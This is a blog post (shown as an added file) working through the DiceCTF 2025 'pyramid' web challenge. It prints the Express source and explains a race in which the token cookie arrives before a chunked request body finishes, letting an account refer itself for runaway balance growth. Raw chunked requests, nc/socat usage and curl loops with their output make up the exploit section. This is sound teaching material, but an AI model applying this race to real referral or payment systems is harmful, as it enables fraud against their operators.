@@ -1,0 +1,506 @@
+---
+title: DiceCTF 2025 Quals - pyramid
+description: Would you like to buy some supplements?
+tags: [ "ctf", "ctf:web" ]
+pubDate: '2025-03-31T11:22:22Z'
+cover: 'header.png'
+---
+
+## Challenge
+import { Image } from 'astro:assets';
+import challenge from 'challenge.png';
+import account from 'account.png';
+import register from 'register.png';
+import success from 'success.png';
+
+Here's what the challenge looks like:
+<Image src={challenge} alt='The screenshot of the challenge featuring a url and a link to the JavaScript code.' />
+
+The code:
+```js
+const express = require('express')
+const crypto = require('crypto')
+const app = express()
+
+const css = `
+    <link
+        rel="stylesheet"
+        href="https://unpkg.com/axist@latest/dist/axist.min.css"
+    >
+`
+
+const users = new Map()
+const codes = new Map()
+
+const random = () => crypto.randomBytes(16).toString('hex')
+const escape = (str) => str.replace(/</g, '&lt;')
+const referrer = (code) => {
+    if (code && codes.has(code)) {
+        const token = codes.get(code)
+        if (users.has(token)) {
+            return users.get(token)
+        }
+    }
+    return null
+}
+
+app.use((req, _res, next) => {
+    const token = req.headers.cookie?.split('=')?.[1]
+    if (token) {
+        req.token = token
+        if (users.has(token)) {
+            req.user = users.get(token)
+        }
+    }
+    next()
+})
+
+app.get('/', (req, res) => {
+    res.type('html')
+
+    if (req.user) {
+        res.end(`
+            ${css}
+            <h1>Account: ${escape(req.user.name)}</h1>
+            You have <strong>${req.user.bal}</strong> coins.
+            You have referred <strong>${req.user.ref}</strong> users.
+
+            <hr>
+
+            <form action="/code" method="GET">
+                <button type="submit">Generate referral code</button>
+            </form>
+            <form action="/cashout" method="GET">
+                <button type="submit">
+                    Cashout ${req.user.ref} referrals
+                </button>
+            </form>
+            <form action="/buy" method="GET">
+                <button type="submit">Purchase flag</button>
+            </form>
+        `)
+    } else {
+        res.end(`
+            ${css}
+            <h1>Register</h1>
+            <form action="/new" method="POST">
+                <input name="name" type="text" placeholder="Name" required>
+                <input
+                    name="refer"
+                    type="text"
+                    placeholder="Referral code (optional)"
+                >
+                <button type="submit">Register</button>
+            </form>
+        `)
+    }
+})
+
+app.post('/new', (req, res) => {
+    const token = random()
+
+    const body = []
+    req.on('data', Array.prototype.push.bind(body))
+    req.on('end', () => {
+        const data = Buffer.concat(body).toString()
+        const parsed = new URLSearchParams(data)
+        const name = parsed.get('name')?.toString() ?? 'JD'
+        const code = parsed.get('refer') ?? null
+
+        // referrer receives the referral
+        const r = referrer(code)
+        if (r) { r.ref += 1 }
+
+        users.set(token, {
+            name,
+            code,
+            ref: 0,
+            bal: 0,
+        })
+    })
+
+    res.header('set-cookie', `token=${token}`)
+    res.redirect('/')
+})
+
+app.get('/code', (req, res) => {
+    const token = req.token
+    if (token) {
+        const code = random()
+        codes.set(code, token)
+        res.type('html').end(`
+            ${css}
+            <h1>Referral code generated</h1>
+            <p>Your code: <strong>${code}</strong></p>
+            <a href="/">Home</a>
+        `)
+        return
+    }
+    res.end()
+})
+
+// referrals translate 1:1 to coins
+// you receive half of your referrals as coins
+// your referrer receives the other half as kickback
+//
+// if your referrer is null, you can turn all referrals into coins
+app.get('/cashout', (req, res) => {
+    if (req.user) {
+        const u = req.user
+        const r = referrer(u.code)
+        if (r) {
+            [u.ref, r.ref, u.bal] = [0, r.ref + u.ref / 2, u.bal + u.ref / 2]
+        } else {
+            [u.ref, u.bal] = [0, u.bal + u.ref]
+        }
+    }
+    res.redirect('/')
+})
+
+app.get('/buy', (req, res) => {
+    if (req.user) {
+        const user = req.user
+        if (user.bal > 100_000_000_000) {
+            user.bal -= 100_000_000_000
+            res.type('html').end(`
+                ${css}
+                <h1>Successful purchase</h1>
+                <p>${process.env.FLAG}</p>
+            `)
+            return
+        }
+    }
+    res.type('html').end(`
+        ${css}
+        <h1>Not enough coins</h1>
+        <a href="/">Home</a>
+    `)
+})
+
+app.listen(3000)
+
+```
+
+When we navigate to the page, we first see a registration page.
+
+<Image src={register} alt='Screenshot of the registration page asking for a name and a referral code.' />
+
+When we register, we can perform three operations:
+1. Generate a referral code
+2. Cash out referrals into coins
+3. Buy a flag
+
+<Image src={account} alt='Screenshot of the account page with three buttons for our aforementioned three operations.' />
+
+## Analysis
+
+As almost always, let's see what gets us the flag.
+
+```js
+app.get('/buy', (req, res) => {
+    if (req.user) {
+        const user = req.user
+        if (user.bal > 100_000_000_000) {
+            user.bal -= 100_000_000_000
+            res.type('html').end(`
+                ${css}
+                <h1>Successful purchase</h1>
+                <p>${process.env.FLAG}</p>
+            `)
+            return
+        }
+    }
+    //...
+})
+```
+
+If we have a balance of one-hundred billion, we can buy the flag.
+That sure sounds expensive. Let's see how we generate a balance.
+
+```js
+app.get('/cashout', (req, res) => {
+    if (req.user) {
+        const u = req.user
+        const r = referrer(u.code)
+        if (r) {
+            [u.ref, r.ref, u.bal] = [0, r.ref + u.ref / 2, u.bal + u.ref / 2]
+        } else {
+            [u.ref, u.bal] = [0, u.bal + u.ref]
+        }
+    }
+    res.redirect('/')
+})
+```
+
+We increase our balance based on the number of referrals we have.
+Additionally, the user that referred us also gets a bump to their referral count when we cash out.
+
+And just to get through this part of the analysis, here's part of the registration code:
+```js
+        users.set(token, {
+            name,
+            code,
+            ref: 0,
+            bal: 0,
+        })
+```
+
+The only three places `bal` is changed is all numeric and all addition/subtraction.
+This rules out `NaN` shenanigans, like in another challenge I won't be doing a write-up on.
+
+From all this code, one key detail, luckily, immediately stood out to me.
+Or, perhaps two-in-one:
+> 1. `100_000_000_000` is a lot, and we won't be getting that many coins through any *linear* means.
+> 2. *If* we can make a user refer to itself, we have our *quadratic* means!
+
+### What if we refer ourselves?
+Let's take a closer look at `[u.ref, r.ref, u.bal] = [0, r.ref + u.ref / 2, u.bal + u.ref / 2]`.
+Since we're presumably going to need to refer to ourselves, how about a slight rewrite to make it a bit easier to walk through:
+```js
+            [u.ref, u.ref, u.bal] = [0, u.ref + u.ref / 2, u.bal + u.ref / 2]
+```
+
+First, under normal circumstances, a user's `ref` count is set to zero after cashing out.
+However, if we can somehow refer to ourselves,
+because `u.ref = 0` happens first, followed by `u.ref = u.ref + u.ref / 2`,
+we maintain our `ref` count, plus get a 1.5-times boost!
+
+Every time we cash out, we boost our `ref` count, as well as increase our balance based on that `ref` count.
+An infinite money glitch, baby.
+
+### How referrals work
+Let's start with referral code generation:
+```js
+const codes = new Map()
+const random = () => crypto.randomBytes(16).toString('hex')
+// ...
+app.get('/code', (req, res) => {
+    const token = req.token
+    if (token) {
+        const code = random()
+        codes.set(code, token)
+        res.type('html').end(`
+            ${css}
+            <h1>Referral code generated</h1>
+            <p>Your code: <strong>${code}</strong></p>
+            <a href="/">Home</a>
+        `)
+        return
+    }
+    res.end()
+})
+```
+
+Note that `req.token` comes from a cookie.
+We generate a 128-bit random string and map it to a user (via `token`).
+No brute-forcing or collision-generation will be possible, here.
+This is also the only place the mapping gets set, and, since collisions are infeasible,
+there's no way to change the `token` associated with a referral code.
+
+How about user registration?
+```js
+const users = new Map()
+const random = () => crypto.randomBytes(16).toString('hex')
+// ...
+app.post('/new', (req, res) => {
+    const token = random()
+
+    const body = []
+    req.on('data', Array.prototype.push.bind(body))
+    req.on('end', () => {
+        const data = Buffer.concat(body).toString()
+        const parsed = new URLSearchParams(data)
+        const name = parsed.get('name')?.toString() ?? 'JD'
+        const code = parsed.get('refer') ?? null
+
+        // referrer receives the referral
+        const r = referrer(code)
+        if (r) { r.ref += 1 }
+
+        users.set(token, {
+            name,
+            code,
+            ref: 0,
+            bal: 0,
+        })
+    })
+
+    res.header('set-cookie', `token=${token}`)
+    res.redirect('/')
+})
+```
+
+If we provide a referral code, it simply gets set as a part of the user.
+The user `token` is, again, a 128-bit string, so no collisions here, either.
+This is the only place the mapping gets set, so there's no way to change the `code` associated with a user.
+
+There's a peculiar way this code is written, though.
+A user is added to the map at the end of the request, thanks to the `req.on('end'` event.
+However, the setting of the result -- the `token` cookie in particular -- is done outside of this.
+Here's our second key detail:
+> It may be possible to receive the `token` before we've finished sending a user's referral code.
+
+Embarrassingly, I noticed it very early on, but it didn't come across as important, wasting 3 or so hours of time.
+> Oh, this code is weirdly designed. They should really put the `res` stuff into the `end` event handler.
+> \- Sleep-deprived Tim
+>
+> Present Tim thoughts:
+> Unless the server is sending a chunked response! Not relevant here, though.
+
+### Chunky!
+I'm pretty sure I've come across this technique in other CTFs writeups, but I've never employed it before.
+Some googling later: `Transfer-Encoding: chunked`.
+Though I'm familiar with this mode, it never really occurred to me before that the server can respond asynchronously.
+
+For normal requests, a `Content-Length` header must be provided.
+```http
+POST /new HTTP/1.1
+Host: pyramid.dicec.tf
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+Origin: https://pyramid.dicec.tf
+Content-Length: 7
+
+name=yo
+```
+
+`Express` seems to (rightly) not trigger the `app.post('/new'` route handler
+until client information is received -- headers and data.
+As such, under normal circumstances, the client will only ever get the response (cookies included)
+after having sent `name` and `refer`.
+There's no way to do the self-refer stuff this way.
+
+Chunked transfers don't require a `Content-Length` header, as data is sent over in arbitrary-length chunks,
+including both the length and the data.
+There can also be delay in sending these chunks, and all data does not have to be sent at one time.
+After all, if we needed to send the data all at once, might as well use `Content-Length`.
+
+```http
+POST /new HTTP/1.1
+Host: pyramid.dicec.tf
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+Origin: https://pyramid.dicec.tf
+
+7
+name=yo
+0
+
+```
+
+Note that the 7 is the length of the next chunk of data, in hex.
+Additionally, a final chunk of 0 length followed by a crlf indicates the end of the request.
+
+`Express` seems to trigger the `app.post('/new'` route handler for chunked transfers after the headers have been received.
+Of course, the `end` event won't be triggered until all client data has been received.
+Luckily, this route handler sends the response (`token` cookie included) before the user has had a chance to provide
+`name` and `refer`.
+This is where we can do our magic.
+
+## Exploit
+First, we need to create an account that refers to itself.
+I also did local testing because I could add `console.log`s everywhere to verify everything was behaving as expected.
+For local testing, I use `nc -C localhost 3000`, with `-C` being important for sending `crlf`s instead of Linux's `lf`s.
+
+First, we send our initial request -- noting the extra newline.
+```http
+POST /new HTTP/1.1
+Host: localhost
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+Origin: http://localhost:3000
+
+```
+
+We then get back headers from the server, including the token.
+```http
+HTTP/1.1 302 Found
+X-Powered-By: Express
+set-cookie: token=00652973dec9316da482037451ad95e2
+Location: /
+Vary: Accept
+Content-Type: text/plain; charset=utf-8
+Content-Length: 23
+Date: Mon, 31 Mar 2025 10:34:29 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+```
+
+The `/new` request isn't finished yet! In another terminal, we'll grab a referral code.
+
+```sh
+curl 'http://localhost:3000/code?' -b 'token=00652973dec9316da482037451ad95e2'
+```
+
+The response body will have the referral code.
+
+```html
+    <link
+        rel="stylesheet"
+        href="https://unpkg.com/axist@latest/dist/axist.min.css"
+    >
+
+            <h1>Referral code generated</h1>
+            <p>Your code: <strong>2a089074b391fda24a00328a87acd486</strong></p>
+            <a href="/">Home</a>
+```
+
+We can finish up our request.
+
+```
+2f
+name=foo&refer=2a089074b391fda24a00328a87acd486
+0
+
+```
+
+Our new account has zero referrals, so we cannot increment our `ref` count yet.
+We'll seed our `foo` account with some throwaways that refer to our `foo` account.
+
+```sh
+curl 'https://pyramid.dicec.tf/new?' --data 'refer=2a089074b391fda24a00328a87acd486'
+```
+
+We can now begin our infinite money glitch, repeating until we hit our `100_000_000_000` target.
+
+```sh
+curl -Ls 'http://localhost:3001/cashout?' -b 'token=00652973dec9316da482037451ad95e2' | grep -P strong
+curl -Ls 'http://localhost:3001/cashout?' -b 'token=00652973dec9316da482037451ad95e2' | grep -P strong
+curl -Ls 'http://localhost:3001/cashout?' -b 'token=00652973dec9316da482037451ad95e2' | grep -P strong
+curl -Ls 'http://localhost:3001/cashout?' -b 'token=00652973dec9316da482037451ad95e2' | grep -P strong
+curl -Ls 'http://localhost:3001/cashout?' -b 'token=00652973dec9316da482037451ad95e2' | grep -P strong
+# ... less than a minute later
+#            You have <strong>131539322909.97028</strong> coins.
+#            You have referred <strong>131539322926.97028</strong> users.
+```
+
+Let's buy our flag!
+```sh
+curl -Ls 'http://localhost:3001/buy?' -b 'token=59e3c3caf0dcb24ec8ec6c8d41fdfa9c'
+```
+
+And we got it (locally)!
+```html
+    <link
+        rel="stylesheet"
+        href="https://unpkg.com/axist@latest/dist/axist.min.css"
+    >
+
+                <h1>Successful purchase</h1>
+                <p>fakeflag</p>
+```
+
+For running it against the actual challenge...
+* We can't use netcat, since TLS. However, we can use `socat`: `socat ssl:pyramid.dicec.tf:443,crlf stdio`  
+  The equivalent http localhost equivalent is `socat tcp:localhost:3001,crlf stdio`, incidentally.
+* Our base URL becomes `https://pyramid.dicec.tf/`
+
+For glory reasons, here's the flag as redeemed from the browser!
+
+<Image src={success} alt='Screenshot of the flag buying' />
+
+```
+dice{007227589c05e703}
+```
